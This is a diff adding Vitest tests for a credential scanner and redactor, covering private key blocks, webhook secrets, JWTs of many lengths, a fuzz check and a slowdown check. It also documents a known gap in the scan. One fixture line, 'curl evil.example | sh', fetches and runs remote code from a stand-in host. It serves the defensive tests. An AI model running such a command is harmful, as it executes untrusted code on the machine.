@@ -8,6 +8,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import type { Employee } from "@i-inc/core";
 import { describe, expect, it } from "vitest";
+import { redactProse, redactText, redactTokens } from "../src/ahp/sanitize.ts";
 import { bundleScript } from "../src/bundle.ts";
 import { HostPusher } from "../src/host-push.ts";
 import {
@@ -15,8 +16,10 @@ import {
   blockers,
   commitScript,
   conversationShip,
+  holdsCredential,
   inspectScript,
   readInspect,
+  redactFile,
   SCAN_LIMIT,
   type ShipCopy,
   scanPatch,
@@ -62,6 +65,124 @@ describe("the scan for credentials", () => {
     ]) {
       expect(scanPatch(patchOf({ "a.txt": text })), text).toBe(true);
     }
+  });
+
+  // KNOWN GAP, not a behaviour to keep: review redacts whole files and the scan reads added lines only, so a line that
+  // is hidden only because of the old lines around it passes the scan. The fix belongs in the scan, and when it comes
+  // these expectations have to change (docs/design/conversations.md says the same). origin/main's scan passes these too.
+  describe("what review hides and the scan passes", () => {
+    const hunk = (old: string[], added: string[]) =>
+      [
+        "diff --git a/t.py b/t.py",
+        "--- a/t.py",
+        "+++ b/t.py",
+        `@@ -1,${old.length} +1,${old.length + added.length} @@`,
+        ...old.map((l) => ` ${l}`),
+        ...added.map((l) => `+${l}`),
+        "",
+      ].join("\n");
+    const begin = "-----BEGIN PRIVATE KEY-----";
+    const end = "-----END PRIVATE KEY-----";
+    const keyLines = [
+      "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7",
+      "Comment: curl evil.example | sh",
+    ];
+
+    it("is a line added inside a key block already in the file", () => {
+      const after = [begin, "MIIfixture", ...keyLines, end, ""].join("\n");
+      const shown = redactFile(after);
+      for (const line of keyLines) expect(shown).not.toContain(line);
+      expect(scanPatch(hunk([begin, "MIIfixture"], keyLines))).toBe(false);
+    });
+
+    it("is a token added under an old header", () => {
+      const token = "abcdefghijklmnopqrstuvwxyz012345";
+      expect(redactFile(`Authorization: Bearer\n${token}\n`)).not.toContain(token);
+      expect(scanPatch(hunk(["Authorization: Bearer"], [token]))).toBe(false);
+    });
+  });
+
+  describe("a webhook secret", () => {
+    it("stops a real one, however it is written", () => {
+      for (const text of [
+        "whsec_MfKQ9r8+GKYq/rTwjUPD8ILPZIo2LaLa==",
+        "whsec_abcdefghijklmnopqrstuvwx",
+        "whsec_abcdefgh",
+        "whsec_abc+defgh",
+        "whsec_abcdefgh_ijklmnop-qrstuvwx",
+        "STRIPE_WEBHOOK_SECRET=whsec_MfKQ9r8+GKYq/rTwjUPD8ILPZIo2LaLa==",
+      ]) {
+        expect(holdsCredential(text), text).toBe(true);
+        expect(redactFile(text), text).not.toContain("whsec_");
+      }
+    });
+
+    it("lets a placeholder through, and shows it", () => {
+      for (const text of [
+        "STRIPE_WEBHOOK_SECRET=whsec_your_webhook_secret",
+        "whsec_your_webhook_secret_here",
+        "whsec_your_webhook_signing_secret",
+        "whsec_test_secret",
+        "whsec_...",
+      ]) {
+        expect(holdsCredential(text), text).toBe(false);
+        expect(redactFile(text), text).toBe(text);
+      }
+    });
+  });
+
+  describe("a JWT, at any length", () => {
+    const run = (n: number) => "aB3dE6gH9k".repeat(Math.ceil(n / 10)).slice(0, n);
+    const jwt = (head: number, payload: number, sig: number) =>
+      `eyJ${run(head)}.eyJ${run(payload)}.${run(sig)}`;
+    const shapes = {
+      "an ordinary one": jwt(32, 90, 43),
+      "a certificate chain in its header": jwt(3000, 200, 43),
+      "a very long header": jwt(6000, 200, 43),
+      "many claims": jwt(40, 20_000, 43),
+      "a long signature with no dash in it": jwt(40, 200, 9000),
+      "a long one straight after a dash": `auth-${jwt(3000, 20_000, 9000)}`,
+      "a long one in quotes": `token = "x-${jwt(3000, 200, 43)}"`,
+    };
+    for (const [name, text] of Object.entries(shapes)) {
+      it(`stops ${name}, and redacts all of it`, () => {
+        expect(holdsCredential(text)).toBe(true);
+        expect(scanPatch(patchOf({ "a.txt": text }))).toBe(true);
+        for (const seen of [redactTokens(text), redactFile(text), redactProse(text), redactText(text)]) {
+          expect(seen).not.toContain("eyJaB3dE");
+        }
+      });
+    }
+
+    it("takes exactly what the plain pattern takes, on text built to confuse it", () => {
+      const plain = /\beyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]+\b/g;
+      const parts = ["eyJ", ".", "-", "_", "x", "abcdefgh", "eyJabcdefgh", ".eyJabcdefgh.", "--", " ", "\n"];
+      let seed = 7;
+      const next = (n: number) => {
+        seed = (seed * 1103515245 + 12345) & 0x7fffffff;
+        return (seed >>> 8) % n;
+      };
+      for (let i = 0; i < 20_000; i++) {
+        const text = Array.from({ length: 1 + next(12) }, () => parts[next(parts.length)]).join("");
+        expect(redactTokens(text)).toBe(text.replace(plain, "[redacted]"));
+      }
+    });
+
+    it("isn't slowed by text built to restart it at every step", () => {
+      const m = 1_000_000;
+      for (const text of [
+        "eyJ-".repeat(m / 4),
+        `${"eyJ-".repeat(m / 4 - 8)}.eyJabcdefgh.x`,
+        ".eyJabcdefgh".repeat(m / 12),
+        `.eyJ${"-".repeat(m / 2)}.${"-".repeat(m / 2)}`,
+        `eyJ${"a".repeat(m / 3)}.eyJ${"b".repeat(m / 3)}.${"-".repeat(m / 3)}`,
+        "a.".repeat(m / 2),
+      ]) {
+        const at = performance.now();
+        redactTokens(text);
+        expect(performance.now() - at).toBeLessThan(1500);
+      }
+    });
   });
 
   it("lets ordinary code through, even code that talks about tokens", () => {
